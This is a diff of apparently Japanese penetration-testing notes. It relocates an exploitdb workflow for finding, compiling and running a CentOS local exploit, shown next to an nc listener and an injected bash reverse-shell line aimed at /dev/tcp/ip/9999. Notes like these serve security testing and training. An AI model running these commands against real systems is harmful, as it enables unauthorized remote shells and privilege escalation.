@@ -16,13 +16,6 @@ Webサーバ
     cat /etc/redhat-release
     cat /proc/version
 
-exploitdb https://github.com/offensive-security/exploitdb
-
-    searchsploit CentOS 4.0
-    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
-    gcc gcc 9542.c -o test
-    ./test
-
 ## Delivery
 
 http転送
@@ -38,5 +31,11 @@ bashリバースシェル http://pentestmonkey.net/cheat-sheet/shells/reverse-sh
     nc -lvp 9999
     ;bash -i >& /dev/tcp/ip/9999 0>&1
 
+exploitdb https://github.com/offensive-security/exploitdb
+
+    searchsploit CentOS 4.0
+    cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
+    gcc gcc XXX.c -o test
+    ./test
 
 
